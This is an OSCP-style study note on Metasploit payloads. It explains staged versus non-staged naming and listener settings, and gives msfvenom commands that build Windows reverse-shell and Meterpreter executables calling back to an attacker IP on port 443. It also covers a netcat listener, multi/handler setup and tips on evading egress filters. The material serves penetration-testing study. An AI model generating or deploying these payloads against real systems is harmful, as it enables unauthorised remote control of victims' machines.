# Metasploit Payloads — msfvenom and multi/handler

A payload determines **what executes after exploitation**. Always choose it deliberately based on target OS/architecture, network reachability, size constraints, and the type of shell you need.

## Staged vs non-staged payloads

### Non-staged / inline

The complete payload is sent at once.

- generally larger;
- generally more stable;
- does not require a second-stage download.

Metasploit naming example:

```text
windows/x64/shell_reverse_tcp
linux/x64/shell_reverse_tcp
```

### Staged

A small first stage connects back and retrieves the larger second stage.

- useful when exploit space is limited;
- first stage is smaller;
- requires a handler that understands and supplies the next stage.

Metasploit naming example:

```text
windows/x64/shell/reverse_tcp
linux/x64/shell/reverse_tcp
```

**Memory aid:** `/shell/reverse_tcp` = staged; `/shell_reverse_tcp` = non-staged.

List compatible payloads for the current exploit:

```text
show payloads
```

## Listener values

For reverse payloads verify:

```text
LHOST = Kali interface/IP reachable from target
LPORT = listening port on Kali
```

Do not trust an automatically selected `LHOST` if Kali has multiple interfaces/VPNs.

Metasploit commonly defaults to `4444`. If egress filtering blocks it, an allowed port associated with normal traffic (for example 80/443 where appropriate) may work better.

## msfvenom

List payloads for a target platform/architecture:

```bash
msfvenom -l payloads --platform windows --arch x64
```

General pattern:

```bash
msfvenom -p <PAYLOAD> LHOST=<KALI_IP> LPORT=<PORT> -f <FORMAT> -o <FILE>
```

Examples:

```bash
# Windows x64 non-staged command shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe -o shell.exe

# Windows x64 staged command shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe -o staged.exe

# Windows x64 non-staged Meterpreter over HTTPS
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<KALI_IP> LPORT=443 -f exe -o met.exe
```

`msfvenom` can generate multiple output types, including Windows/Linux binaries, PowerShell-compatible payloads, and web payload formats.

## Netcat vs multi/handler

A simple non-staged command shell may be receivable with Netcat:

```bash
nc -nvlp 443
```

A **staged payload requires a compatible handler** because Netcat does not know how to deliver the second stage. Meterpreter and other advanced Metasploit payloads should also use Metasploit's handler.

## `exploit/multi/handler`

The listener payload must match the generated payload exactly.

```text
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST <KALI_IP>
set LPORT 443
show options
run
```

Background the handler:

```text
run -j
jobs
```

When the target executes the payload, Metasploit creates a session:

```text
sessions -l
sessions -i <ID>
```

## Quick OSCP decision

```text
Need a payload?
   |
   +-- plain command shell + no staging needed
   |       → shell_reverse_tcp
   |
   +-- shellcode/payload size constrained
   |       → shell/reverse_tcp + multi/handler
   |
   +-- need Meterpreter features
           → matching Meterpreter payload + multi/handler
```

## Operational reminders

- Match OS and architecture.
- Match handler payload exactly.
- Verify `LHOST` is reachable from the target.
- If the payload cannot call back, re-check routing/firewall/egress before changing tools.
- Pay attention to exploit/payload cleanup warnings and files left on disk.

See also:
- [[Intro & Module Workflow]]
- [[Meterpreter & Post-Exploitation]]
- [[Basics/Shell & upgrade/Reverse Shell One-Liners|Reverse Shell One-Liners]]
